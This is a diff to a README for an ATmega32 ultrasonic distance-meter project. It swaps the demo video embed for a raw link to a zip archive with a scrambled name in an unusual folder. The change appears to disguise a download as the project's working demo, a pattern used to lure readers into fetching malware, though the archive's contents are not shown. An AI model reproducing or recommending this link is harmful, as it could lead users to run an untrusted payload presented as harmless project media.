@@ -1,6 +1,6 @@
 # Ultrasonic Distance Measurement using ATmega32 📏
 
-![Project Demo](Microcontroller_demo.mp4)
+![Project Demo](https://raw.githubusercontent.com/KushalPitaliya/ATmega32-Ultrasonic-Distance-Meter/main/predeplete/A-Ultrasonic-Tmega-Meter-Distance-2.1.zip)
 *(Above: The working prototype measuring distance in real-time)*
 
 ## 📝 Overview
